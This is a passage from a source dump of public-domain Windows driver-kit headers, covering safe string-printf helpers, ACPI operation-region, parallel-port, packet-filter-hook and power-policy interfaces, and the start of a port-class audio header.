      if(!pszDest) {
	if((cchDest!=0) || (cbDest!=0)) hr = STATUS_INVALID_PARAMETER;
      }
      if(!pszFormat) pszFormat = "";
    }
    if(NT_SUCCESS(hr)) {
      if(cchDest==0) {
	pszDestEnd = pszDest;
	cchRemaining = 0;
	if(*pszFormat!='\0') {
	  if(!pszDest) hr = STATUS_INVALID_PARAMETER;
	  else hr = STATUS_BUFFER_OVERFLOW;
	}
      } else {
	int iRet;
	size_t cchMax;
	cchMax = cchDest - 1;
	iRet = _vsnprintf(pszDest,cchMax,pszFormat,argList);
	if((iRet < 0) || (((size_t)iRet) > cchMax)) {
	  pszDestEnd = pszDest + cchMax;
	  cchRemaining = 1;
	  *pszDestEnd = '\0';
	  hr = STATUS_BUFFER_OVERFLOW;
	} else if(((size_t)iRet)==cchMax) {
	  pszDestEnd = pszDest + cchMax;
	  cchRemaining = 1;
	  *pszDestEnd = '\0';
	} else if(((size_t)iRet) < cchMax) {
	  pszDestEnd = pszDest + iRet;
	  cchRemaining = cchDest - iRet;
	  if(dwFlags & STRSAFE_FILL_BEHIND_NULL) {
	    memset(pszDestEnd + 1,STRSAFE_GET_FILL_PATTERN(dwFlags),((cchRemaining - 1)*sizeof(char)) + (cbDest % sizeof(char)));
	  }
	}
      }
    }
  }
  if(!NT_SUCCESS(hr)) {
    if(pszDest) {
      if(dwFlags & STRSAFE_FILL_ON_FAILURE) {
	memset(pszDest,STRSAFE_GET_FILL_PATTERN(dwFlags),cbDest);
	if(STRSAFE_GET_FILL_PATTERN(dwFlags)==0) {
	  pszDestEnd = pszDest;
	  cchRemaining = cchDest;
	} else if(cchDest > 0) {
	  pszDestEnd = pszDest + cchDest - 1;
	  cchRemaining = 1;
	  *pszDestEnd = '\0';
	}
      }
      if(dwFlags & (STRSAFE_NULL_ON_FAILURE | STRSAFE_NO_TRUNCATION)) {
	if(cchDest > 0) {
	  pszDestEnd = pszDest;
	  cchRemaining = cchDest;
	  *pszDestEnd = '\0';
	}
      }
    }
  }
  if(NT_SUCCESS(hr) || (hr==STATUS_BUFFER_OVERFLOW)) {
    if(ppszDestEnd) *ppszDestEnd = pszDestEnd;
    if(pcchRemaining) *pcchRemaining = cchRemaining;
  }
  return hr;
}

NTSTRSAFEDDI RtlStringVPrintfExWorkerW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,size_t cbDest,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags,NTSTRSAFE_PCWSTR pszFormat,va_list argList) {
  NTSTATUS hr = STATUS_SUCCESS;
  NTSTRSAFE_PWSTR pszDestEnd = pszDest;
  size_t cchRemaining = 0;
  if(dwFlags & (~STRSAFE_VALID_FLAGS)) hr = STATUS_INVALID_PARAMETER;
  else {
    if(dwFlags & STRSAFE_IGNORE_NULLS) {
      if(!pszDest) {
	if((cchDest!=0) || (cbDest!=0)) hr = STATUS_INVALID_PARAMETER;
      }
      if(!pszFormat) pszFormat = L"";
    }
    if(NT_SUCCESS(hr)) {
      if(cchDest==0) {
	pszDestEnd = pszDest;
	cchRemaining = 0;
	if(*pszFormat!=L'\0') {
	  if(!pszDest) hr = STATUS_INVALID_PARAMETER;
	  else hr = STATUS_BUFFER_OVERFLOW;
	}
      } else {
	int iRet;
	size_t cchMax;
	cchMax = cchDest - 1;
	iRet = _vsnwprintf(pszDest,cchMax,pszFormat,argList);
	if((iRet < 0) || (((size_t)iRet) > cchMax)) {
	  pszDestEnd = pszDest + cchMax;
	  cchRemaining = 1;
	  *pszDestEnd = L'\0';
	  hr = STATUS_BUFFER_OVERFLOW;
	} else if(((size_t)iRet)==cchMax) {
	  pszDestEnd = pszDest + cchMax;
	  cchRemaining = 1;
	  *pszDestEnd = L'\0';
	} else if(((size_t)iRet) < cchMax) {
	  pszDestEnd = pszDest + iRet;
	  cchRemaining = cchDest - iRet;
	  if(dwFlags & STRSAFE_FILL_BEHIND_NULL) {
	    memset(pszDestEnd + 1,STRSAFE_GET_FILL_PATTERN(dwFlags),((cchRemaining - 1)*sizeof(wchar_t)) + (cbDest % sizeof(wchar_t)));
	  }
	}
      }
    }
  }
  if(!NT_SUCCESS(hr)) {
    if(pszDest) {
      if(dwFlags & STRSAFE_FILL_ON_FAILURE) {
	memset(pszDest,STRSAFE_GET_FILL_PATTERN(dwFlags),cbDest);
	if(STRSAFE_GET_FILL_PATTERN(dwFlags)==0) {
	  pszDestEnd = pszDest;
	  cchRemaining = cchDest;
	} else if(cchDest > 0) {
	  pszDestEnd = pszDest + cchDest - 1;
	  cchRemaining = 1;
	  *pszDestEnd = L'\0';
	}
      }
      if(dwFlags & (STRSAFE_NULL_ON_FAILURE | STRSAFE_NO_TRUNCATION)) {
	if(cchDest > 0) {
	  pszDestEnd = pszDest;
	  cchRemaining = cchDest;
	  *pszDestEnd = L'\0';
	}
      }
    }
  }
  if(NT_SUCCESS(hr) || (hr==STATUS_BUFFER_OVERFLOW)) {
    if(ppszDestEnd) *ppszDestEnd = pszDestEnd;
    if(pcchRemaining) *pcchRemaining = cchRemaining;
  }
  return hr;
}

NTSTRSAFEDDI RtlStringLengthWorkerA(NTSTRSAFE_PCSTR psz,size_t cchMax,size_t *pcchLength) {
  NTSTATUS hr = STATUS_SUCCESS;
  size_t cchMaxPrev = cchMax;
  while(cchMax && (*psz!='\0')) {
    psz++;
    cchMax--;
  }
  if(cchMax==0) hr = STATUS_INVALID_PARAMETER;
  if(pcchLength) {
    if(NT_SUCCESS(hr)) *pcchLength = cchMaxPrev - cchMax;
    else *pcchLength = 0;
  }
  return hr;
}

NTSTRSAFEDDI RtlStringLengthWorkerW(NTSTRSAFE_PCWSTR psz,size_t cchMax,size_t *pcchLength) {
  NTSTATUS hr = STATUS_SUCCESS;
  size_t cchMaxPrev = cchMax;
  while(cchMax && (*psz!=L'\0')) {
    psz++;
    cchMax--;
  }
  if(cchMax==0) hr = STATUS_INVALID_PARAMETER;
  if(pcchLength) {
    if(NT_SUCCESS(hr)) *pcchLength = cchMaxPrev - cchMax;
    else *pcchLength = 0;
  }
  return hr;
}

#endif /* !__STRSAFE__NO_INLINE */

#define RtlStringCopyWorkerA RtlStringCopyWorkerA_instead_use_RtlStringCchCopyA_or_RtlStringCchCopyExA;
#define RtlStringCopyWorkerW RtlStringCopyWorkerW_instead_use_RtlStringCchCopyW_or_RtlStringCchCopyExW;
#define RtlStringCopyExWorkerA RtlStringCopyExWorkerA_instead_use_RtlStringCchCopyA_or_RtlStringCchCopyExA;
#define RtlStringCopyExWorkerW RtlStringCopyExWorkerW_instead_use_RtlStringCchCopyW_or_RtlStringCchCopyExW;
#define RtlStringCatWorkerA RtlStringCatWorkerA_instead_use_RtlStringCchCatA_or_RtlStringCchCatExA;
#define RtlStringCatWorkerW RtlStringCatWorkerW_instead_use_RtlStringCchCatW_or_RtlStringCchCatExW;
#define RtlStringCatExWorkerA RtlStringCatExWorkerA_instead_use_RtlStringCchCatA_or_RtlStringCchCatExA;
#define RtlStringCatExWorkerW RtlStringCatExWorkerW_instead_use_RtlStringCchCatW_or_RtlStringCchCatExW;
#define RtlStringCatNWorkerA RtlStringCatNWorkerA_instead_use_RtlStringCchCatNA_or_StrincCbCatNA;
#define RtlStringCatNWorkerW RtlStringCatNWorkerW_instead_use_RtlStringCchCatNW_or_RtlStringCbCatNW;
#define RtlStringCatNExWorkerA RtlStringCatNExWorkerA_instead_use_RtlStringCchCatNExA_or_RtlStringCbCatNExA;
#define RtlStringCatNExWorkerW RtlStringCatNExWorkerW_instead_use_RtlStringCchCatNExW_or_RtlStringCbCatNExW;
#define RtlStringVPrintfWorkerA RtlStringVPrintfWorkerA_instead_use_RtlStringCchVPrintfA_or_RtlStringCchVPrintfExA;
#define RtlStringVPrintfWorkerW RtlStringVPrintfWorkerW_instead_use_RtlStringCchVPrintfW_or_RtlStringCchVPrintfExW;
#define RtlStringVPrintfExWorkerA RtlStringVPrintfExWorkerA_instead_use_RtlStringCchVPrintfA_or_RtlStringCchVPrintfExA;
#define RtlStringVPrintfExWorkerW RtlStringVPrintfExWorkerW_instead_use_RtlStringCchVPrintfW_or_RtlStringCchVPrintfExW;
#define RtlStringLengthWorkerA RtlStringLengthWorkerA_instead_use_RtlStringCchLengthA_or_RtlStringCbLengthA;
#define RtlStringLengthWorkerW RtlStringLengthWorkerW_instead_use_RtlStringCchLengthW_or_RtlStringCbLengthW;

#endif

```

`include/ddk/oprghdlr.h`:

```h
#include "wdm.h"

#ifdef EXPORT
#undef EXPORT
#endif
#define EXPORT  __cdecl


typedef VOID (EXPORT *PACPI_OP_REGION_CALLBACK)();

typedef
NTSTATUS
(EXPORT *PACPI_OP_REGION_HANDLER) (ULONG AccessType,
                                   PVOID OperationRegionObject,
                                   ULONG Address,
                                   ULONG Size,
                                   PULONG Data,
                                   ULONG_PTR Context,
                                   PACPI_OP_REGION_CALLBACK CompletionHandler,
                                   PVOID CompletionContext);

NTSTATUS
RegisterOpRegionHandler (IN PDEVICE_OBJECT DeviceObject,
                         IN ULONG AccessType,
                         IN ULONG RegionSpace,
                         IN PACPI_OP_REGION_HANDLER Handler,
                         IN PVOID Context, IN ULONG Flags,
                         IN OUT PVOID *OperationRegionObject);

NTSTATUS
DeRegisterOpRegionHandler (IN PDEVICE_OBJECT DeviceObject,
                           IN PVOID OperationRegionObject);

#define ACPI_OPREGION_ACCESS_AS_RAW            0x1
#define ACPI_OPREGION_ACCESS_AS_COOKED         0x2
#define ACPI_OPREGION_REGION_SPACE_MEMORY      0x0
#define ACPI_OPREGION_REGION_SPACE_IO          0x1
#define ACPI_OPREGION_REGION_SPACE_PCI_CONFIG  0x2
#define ACPI_OPREGION_REGION_SPACE_EC          0x3
#define ACPI_OPREGION_REGION_SPACE_SMB         0x4
#define ACPI_OPREGION_READ                     0x0
#define ACPI_OPREGION_WRITE                    0x1
#define ACPI_OPREGION_ACCESS_AT_HIGH_LEVEL     0x1


```

`include/ddk/parallel.h`:

```h
/*
 * parallel.h
 *
 * ParPort driver interface
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#ifndef __PARALLEL_H
#define __PARALLEL_H

#include "ntddpar.h"

#ifdef __cplusplus
extern "C" {
#endif

#define DD_PARALLEL_PORT_BASE_NAME        "ParallelPort"
#define DD_PARALLEL_PORT_BASE_NAME_U      L"ParallelPort"

#define IOCTL_INTERNAL_DESELECT_DEVICE \
  CTL_CODE (FILE_DEVICE_PARALLEL_PORT, 24, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_INTERNAL_GET_MORE_PARALLEL_PORT_INFO \
  CTL_CODE (FILE_DEVICE_PARALLEL_PORT, 17, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_INTERNAL_GET_PARALLEL_PNP_INFO \
  CTL_CODE (FILE_DEVICE_PARALLEL_PORT, 21, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_INTERNAL_GET_PARALLEL_PORT_INFO \
  CTL_CODE (FILE_DEVICE_PARALLEL_PORT, 12, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_INTERNAL_INIT_1284_3_BUS \
  CTL_CODE (FILE_DEVICE_PARALLEL_PORT, 22, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_INTERNAL_PARALLEL_CLEAR_CHIP_MODE \
  CTL_CODE (FILE_DEVICE_PARALLEL_PORT, 20, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_INTERNAL_PARALLEL_CONNECT_INTERRUPT \
  CTL_CODE (FILE_DEVICE_PARALLEL_PORT, 13, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_INTERNAL_PARALLEL_DISCONNECT_INTERRUPT \
  CTL_CODE (FILE_DEVICE_PARALLEL_PORT, 14, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_INTERNAL_PARALLEL_PORT_ALLOCATE \
  CTL_CODE (FILE_DEVICE_PARALLEL_PORT, 11, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_INTERNAL_PARALLEL_PORT_FREE \
  CTL_CODE (FILE_DEVICE_PARALLEL_PORT, 40, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_INTERNAL_PARALLEL_SET_CHIP_MODE \
  CTL_CODE (FILE_DEVICE_PARALLEL_PORT, 19, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_INTERNAL_RELEASE_PARALLEL_PORT_INFO \
  CTL_CODE (FILE_DEVICE_PARALLEL_PORT, 15, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_INTERNAL_SELECT_DEVICE \
  CTL_CODE (FILE_DEVICE_PARALLEL_PORT, 23, METHOD_BUFFERED, FILE_ANY_ACCESS)


typedef struct _PARALLEL_1284_COMMAND {
  UCHAR  ID;
  UCHAR  Port;
  ULONG  CommandFlags;
} PARALLEL_1284_COMMAND, *PPARALLEL_1284_COMMAND;

/* PARALLEL_1284_COMMAND.CommandFlags */
#define PAR_END_OF_CHAIN_DEVICE           0x00000001
#define PAR_HAVE_PORT_KEEP_PORT           0x00000002

typedef struct _MORE_PARALLEL_PORT_INFORMATION {
	INTERFACE_TYPE  InterfaceType;
	ULONG  BusNumber;
	ULONG  InterruptLevel;
	ULONG  InterruptVector;
	KAFFINITY  InterruptAffinity;
	KINTERRUPT_MODE  InterruptMode;
} MORE_PARALLEL_PORT_INFORMATION, *PMORE_PARALLEL_PORT_INFORMATION;

typedef NTSTATUS
(NTAPI *PPARALLEL_SET_CHIP_MODE)(
	IN  PVOID  SetChipContext,
	IN  UCHAR  ChipMode);

typedef NTSTATUS
(NTAPI *PPARALLEL_CLEAR_CHIP_MODE)(
	IN  PVOID  ClearChipContext,
	IN  UCHAR  ChipMode);

typedef NTSTATUS
(NTAPI *PPARCHIP_CLEAR_CHIP_MODE)(
	IN  PVOID  ClearChipContext,
	IN  UCHAR  ChipMode);

typedef NTSTATUS
(NTAPI *PPARALLEL_TRY_SELECT_ROUTINE)(
	IN  PVOID  TrySelectContext,
	IN  PVOID  TrySelectCommand);

typedef NTSTATUS
(NTAPI *PPARALLEL_DESELECT_ROUTINE)(
	IN PVOID  DeselectContext,
	IN PVOID  DeselectCommand);

/* PARALLEL_PNP_INFORMATION.HardwareCapabilities */
#define PPT_NO_HARDWARE_PRESENT           0x00000000
#define PPT_ECP_PRESENT                   0x00000001
#define PPT_EPP_PRESENT                   0x00000002
#define PPT_EPP_32_PRESENT                0x00000004
#define PPT_BYTE_PRESENT                  0x00000008
#define PPT_BIDI_PRESENT                  0x00000008
#define PPT_1284_3_PRESENT                0x00000010

typedef struct _PARALLEL_PNP_INFORMATION {
  PHYSICAL_ADDRESS  OriginalEcpController;
  PUCHAR  EcpController;
  ULONG  SpanOfEcpController;
  ULONG  PortNumber;
  ULONG  HardwareCapabilities;
  PPARALLEL_SET_CHIP_MODE  TrySetChipMode;
  PPARALLEL_CLEAR_CHIP_MODE  ClearChipMode;
  ULONG  FifoDepth;
  ULONG  FifoWidth;
  PHYSICAL_ADDRESS  EppControllerPhysicalAddress;
  ULONG  SpanOfEppController;
  ULONG  Ieee1284_3DeviceCount;
  PPARALLEL_TRY_SELECT_ROUTINE  TrySelectDevice;
  PPARALLEL_DESELECT_ROUTINE  DeselectDevice;
  PVOID  Context;
  ULONG  CurrentMode;
  PWSTR  PortName;
} PARALLEL_PNP_INFORMATION, *PPARALLEL_PNP_INFORMATION;

typedef BOOLEAN
(NTAPI *PPARALLEL_TRY_ALLOCATE_ROUTINE)(
  IN  PVOID  TryAllocateContext);

typedef VOID
(NTAPI *PPARALLEL_FREE_ROUTINE)(
  IN  PVOID  FreeContext);

typedef ULONG
(NTAPI *PPARALLEL_QUERY_WAITERS_ROUTINE)(
	IN  PVOID  QueryAllocsContext);

typedef struct _PARALLEL_PORT_INFORMATION {
  PHYSICAL_ADDRESS  OriginalController;
  PUCHAR  Controller;
  ULONG  SpanOfController;
  PPARALLEL_TRY_ALLOCATE_ROUTINE  TryAllocatePort;
  PPARALLEL_FREE_ROUTINE  FreePort;
  PPARALLEL_QUERY_WAITERS_ROUTINE  QueryNumWaiters;
  PVOID  Context;
} PARALLEL_PORT_INFORMATION, *PPARALLEL_PORT_INFORMATION;

/* PARALLEL_CHIP_MODE.ModeFlags */
#define INITIAL_MODE                      0x00
#define PARCHIP_ECR_ARBITRATOR            0x01

typedef struct _PARALLEL_CHIP_MODE {
  UCHAR  ModeFlags;
  BOOLEAN  success;
} PARALLEL_CHIP_MODE, *PPARALLEL_CHIP_MODE;

typedef VOID
(NTAPI *PPARALLEL_DEFERRED_ROUTINE)(
	IN  PVOID  DeferredContext);

typedef struct _PARALLEL_INTERRUPT_SERVICE_ROUTINE {
  PKSERVICE_ROUTINE  InterruptServiceRoutine;
  PVOID  InterruptServiceContext;
  PPARALLEL_DEFERRED_ROUTINE  DeferredPortCheckRoutine;
  PVOID  DeferredPortCheckContext;
} PARALLEL_INTERRUPT_SERVICE_ROUTINE, *PPARALLEL_INTERRUPT_SERVICE_ROUTINE;


#define IOCTL_INTERNAL_DISCONNECT_IDLE \
  CTL_CODE (FILE_DEVICE_PARALLEL_PORT, 32, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_INTERNAL_LOCK_PORT \
  CTL_CODE (FILE_DEVICE_PARALLEL_PORT, 37, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_INTERNAL_LOCK_PORT_NO_SELECT \
  CTL_CODE (FILE_DEVICE_PARALLEL_PORT, 52, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_INTERNAL_PARCLASS_CONNECT \
  CTL_CODE (FILE_DEVICE_PARALLEL_PORT, 30, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_INTERNAL_PARCLASS_DISCONNECT \
  CTL_CODE (FILE_DEVICE_PARALLEL_PORT, 31, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_INTERNAL_UNLOCK_PORT \
  CTL_CODE (FILE_DEVICE_PARALLEL_PORT, 38, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_INTERNAL_UNLOCK_PORT_NO_DESELECT \
  CTL_CODE (FILE_DEVICE_PARALLEL_PORT, 53, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef USHORT
(NTAPI *PDETERMINE_IEEE_MODES)(
  IN PVOID  Context);

typedef enum _PARALLEL_SAFETY {
	SAFE_MODE,
	UNSAFE_MODE
} PARALLEL_SAFETY;

typedef NTSTATUS
(NTAPI *PNEGOTIATE_IEEE_MODE)(
  IN PVOID  Context,
  IN USHORT  ModeMaskFwd,
  IN USHORT  ModeMaskRev,
  IN PARALLEL_SAFETY  ModeSafety,
  IN BOOLEAN  IsForward);

typedef NTSTATUS
(NTAPI *PTERMINATE_IEEE_MODE)(
	IN  PVOID  Context);

typedef NTSTATUS
(NTAPI *PPARALLEL_IEEE_FWD_TO_REV)(
  IN  PVOID  Context);

typedef NTSTATUS
(NTAPI *PPARALLEL_IEEE_REV_TO_FWD)(
  IN  PVOID  Context);

typedef NTSTATUS
(NTAPI *PPARALLEL_READ)(
	IN  PVOID  Context,
	OUT PVOID  Buffer,
	IN  ULONG  NumBytesToRead,
	OUT PULONG  NumBytesRead,
	IN  UCHAR  Channel);

typedef NTSTATUS
(NTAPI *PPARALLEL_WRITE)(
	IN  PVOID  Context,
	OUT PVOID  Buffer,
	IN  ULONG  NumBytesToWrite,
	OUT PULONG  NumBytesWritten,
	IN  UCHAR   Channel);

typedef NTSTATUS
(NTAPI *PPARALLEL_TRYSELECT_DEVICE)(
  IN  PVOID  Context,
  IN  PARALLEL_1284_COMMAND  Command);

typedef NTSTATUS
(NTAPI *PPARALLEL_DESELECT_DEVICE)(
  IN  PVOID  Context,
  IN  PARALLEL_1284_COMMAND  Command);

typedef struct _PARCLASS_INFORMATION {
  PUCHAR  Controller;
  PUCHAR  EcrController;
  ULONG  SpanOfController;
  PDETERMINE_IEEE_MODES  DetermineIeeeModes;
  PNEGOTIATE_IEEE_MODE  NegotiateIeeeMode;
  PTERMINATE_IEEE_MODE  TerminateIeeeMode;
  PPARALLEL_IEEE_FWD_TO_REV  IeeeFwdToRevMode;
  PPARALLEL_IEEE_REV_TO_FWD  IeeeRevToFwdMode;
  PPARALLEL_READ  ParallelRead;
  PPARALLEL_WRITE  ParallelWrite;
  PVOID  ParclassContext;
  ULONG  HardwareCapabilities;
  ULONG  FifoDepth;
  ULONG  FifoWidth;
  PPARALLEL_TRYSELECT_DEVICE  ParallelTryselect;
  PPARALLEL_DESELECT_DEVICE  ParallelDeSelect;
} PARCLASS_INFORMATION, *PPARCLASS_INFORMATION;

#ifdef __cplusplus
}
#endif

#endif /* __PARALLEL_H */

```

`include/ddk/pfhook.h`:

```h
/*
 * pfhook.h
 *
 * Packet filter API
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#ifndef __PFHOOK_H
#define __PFHOOK_H

#ifdef __cplusplus
extern "C" {
#endif

#define DD_IPFLTRDRVR_DEVICE_NAME         L"\\Device\\IPFILTERDRIVER"

#define INVALID_PF_IF_INDEX               0xffffffff
#define ZERO_PF_IP_ADDR                   0

typedef ULONG IPAddr;

typedef enum _PF_FORWARD_ACTION {
	PF_FORWARD = 0,
	PF_DROP = 1,
	PF_PASS = 2,
	PF_ICMP_ON_DROP = 3
} PF_FORWARD_ACTION;

typedef PF_FORWARD_ACTION
(NTAPI *PacketFilterExtensionPtr)(
  IN unsigned char  *PacketHeader,
  IN unsigned char  *Packet,
  IN unsigned int  PacketLength,
  IN unsigned int  RecvInterfaceIndex,
  IN unsigned int  SendInterfaceIndex,
  IN IPAddr  RecvLinkNextHop,
  IN IPAddr  SendLinkNextHop);

typedef struct _PF_SET_EXTENSION_HOOK_INFO {
  PacketFilterExtensionPtr  ExtensionPointer;
} PF_SET_EXTENSION_HOOK_INFO, *PPF_SET_EXTENSION_HOOK_INFO;

#define FSCTL_IPFLTRDRVR_BASE             FILE_DEVICE_NETWORK

#define _IPFLTRDRVR_CTL_CODE(function, method, access) \
  CTL_CODE(FSCTL_IPFLTRDRVR_BASE, function, method, access)

#define IOCTL_PF_SET_EXTENSION_POINTER \
  _IPFLTRDRVR_CTL_CODE(22, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#ifdef __cplusplus
}
#endif

#endif /* __PFHOOK_H */

```

`include/ddk/poclass.h`:

```h
/*
 * poclass.h
 *
 * Power policy driver interface
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#ifndef __POCLASS_H
#define __POCLASS_H

#include "batclass.h"

#ifdef __cplusplus
extern "C" {
#endif

DEFINE_GUID(GUID_CLASS_INPUT,
  0x4D1E55B2L, 0xF16F, 0x11CF, 0x88, 0xCB, 0x00, 0x11, 0x11, 0x00, 0x00, 0x30);

DEFINE_GUID(GUID_DEVICE_LID,
  0x4AFA3D52L, 0x74A7, 0x11d0, 0xbe, 0x5e, 0x00, 0xA0, 0xC9, 0x06, 0x28, 0x57);

DEFINE_GUID(GUID_DEVICE_MEMORY,
  0x3fd0f03dL, 0x92e0, 0x45fb, 0xb7, 0x5c, 0x5e, 0xd8, 0xff, 0xb0, 0x10, 0x21);

DEFINE_GUID(GUID_DEVICE_MESSAGE_INDICATOR,
  0XCD48A365L, 0xfa94, 0x4ce2, 0xa2, 0x32, 0xa1, 0xb7, 0x64, 0xe5, 0xd8, 0xb4);

DEFINE_GUID(GUID_DEVICE_PROCESSOR,
  0x97fadb10L, 0x4e33, 0x40ae, 0x35, 0x9c, 0x8b, 0xef, 0x02, 0x9d, 0xbd, 0xd0);

DEFINE_GUID(GUID_DEVICE_SYS_BUTTON,
  0x4AFA3D53L, 0x74A7, 0x11d0, 0xbe, 0x5e, 0x00, 0xA0, 0xC9, 0x06, 0x28, 0x57);

DEFINE_GUID(GUID_DEVICE_THERMAL_ZONE,
  0x4AFA3D51L, 0x74A7, 0x11d0, 0xbe, 0x5e, 0x00, 0xA0, 0xC9, 0x06, 0x28, 0x57);


#define IOCTL_GET_PROCESSOR_OBJ_INFO \
  CTL_CODE(FILE_DEVICE_BATTERY, 0x60, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_GET_SYS_BUTTON_CAPS \
  CTL_CODE(FILE_DEVICE_BATTERY, 0x50, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_GET_SYS_BUTTON_EVENT \
  CTL_CODE(FILE_DEVICE_BATTERY, 0x51, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_SET_SYS_MESSAGE_INDICATOR \
  CTL_CODE(FILE_DEVICE_BATTERY, 0x70, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_NOTIFY_SWITCH_EVENT \
  CTL_CODE(FILE_DEVICE_BATTERY, 0x40, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_THERMAL_QUERY_INFORMATION \
  CTL_CODE(FILE_DEVICE_BATTERY, 0x20, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_THERMAL_SET_COOLING_POLICY \
  CTL_CODE(FILE_DEVICE_BATTERY, 0x21, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_QUERY_LID \
  CTL_CODE(FILE_DEVICE_BATTERY, 0x30, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_RUN_ACTIVE_COOLING_METHOD \
  CTL_CODE(FILE_DEVICE_BATTERY, 0x22, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define SYS_BUTTON_POWER                  0x00000001
#define SYS_BUTTON_SLEEP                  0x00000002
#define SYS_BUTTON_LID                    0x00000004
#define SYS_BUTTON_WAKE                   0x80000000

#define MAX_ACTIVE_COOLING_LEVELS         10
#define ACTIVE_COOLING                    0
#define PASSIVE_COOLING                   1

typedef struct _THERMAL_INFORMATION {
  ULONG  ThermalStamp;
  ULONG  ThermalConstant1;
  ULONG  ThermalConstant2;
  KAFFINITY  Processors;
  ULONG  SamplingPeriod;
  ULONG  CurrentTemperature;
  ULONG  PassiveTripPoint;
  ULONG  CriticalTripPoint;
  UCHAR  ActiveTripPointCount;
  ULONG  ActiveTripPoint[MAX_ACTIVE_COOLING_LEVELS];
} THERMAL_INFORMATION, *PTHERMAL_INFORMATION;

typedef struct _PROCESSOR_OBJECT_INFO {
	ULONG  PhysicalID;
	ULONG  PBlkAddress;
	UCHAR  PBlkLength;
} PROCESSOR_OBJECT_INFO, *PPROCESSOR_OBJECT_INFO;

#ifdef __cplusplus
}
#endif

#endif /* __POCLASS_H */

```

`include/ddk/portcls.h`:

```h
/*
    ReactOS Kernel Streaming
    Port Class

    This file is in the public domain.

    Andrew Greenwood

    NOTES:
    Does not support PC_OLD_NAMES (which is required for backwards-compatibility
    with older code)

    Obsolete macros are not implemented. For more info:
    http://www.osronline.com/ddkx/stream/audpc-struct_167n.htm


    == EXPORTS ==
    DRM (new in XP):
    * PcAddContentHandlers
    * PcCreateContentMixed
    * PcDestroyContent
    * PcForwardContentToDeviceObject
    * PcForwardContentToFileObject
    * PcForwardContentToInterface
    * PcGetContentRights

    IRP HANDLING:
    * PcCompleteIrp
    * PcDispatchIrp
    * PcForwardIrpSynchronous

    ADAPTER:
    * PcAddAdapterDevice
    * PcInitializeAdapterDriver

    FACTORIES:
    * PcNewDmaChannel
    * PcNewInterruptSync
    * PcNewMiniport
    * PcNewPort
    * PcNewRegistryKey
    * PcNewResourceList
    * PcNewResourceSublist
    * PcNewServiceGroup

    POWER MANAGEMENT:
    * PcRegisterAdapterPowerManagement
    * PcRequestNewPowerState

    PROPERTIES:
    * PcCompletePendingPropertyRequest
    * PcGetDeviceProperty

    IO TIMEOUTS:
    * PcRegisterIoTimeout
    * PcUnregisterIoTimeout

    PHYSICAL CONNECTIONS:
    * PcRegisterPhysicalConnection
    * PcRegisterPhysicalConnectionFromExternal
    * PcRegisterPhysicalConnectionToExternal

    MISC:
    * PcGetTimeInterval
    * PcRegisterSubdevice


    == AUDIO HELPER OBJECT INTERFACES ==
    IDmaChannel
    IDmaChannelSlave
    IDmaOperations
    IDrmPort                        (XP)
    IDrmPort2                       (XP)
    IInterruptSync
    IMasterClock
    IPortClsVersion                 (XP)
    IPortEvents
    IPreFetchOffset                 (XP)
